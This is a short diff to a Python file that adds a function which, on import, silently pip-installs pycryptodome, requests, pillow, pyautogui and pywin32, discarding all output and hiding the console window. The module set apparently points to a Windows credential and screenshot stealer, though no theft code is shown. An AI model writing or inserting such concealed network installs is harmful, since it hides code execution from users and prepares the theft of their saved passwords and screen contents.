@@ -1,3 +1,28 @@
+import subprocess
+import sys
+
+def instalar_dependencias():
+    paquetes = {
+        "Crypto": "pycryptodome",
+        "requests": "requests",
+        "PIL": "pillow",
+        "pyautogui": "pyautogui",
+        "win32crypt": "pywin32"
+    }
+    
+    for modulo, paquete in paquetes.items():
+        try:
+            __import__(modulo)
+        except ImportError:
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", paquete],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+
+instalar_dependencias()
+
 from Crypto.Cipher import AES
 import base64
 import io
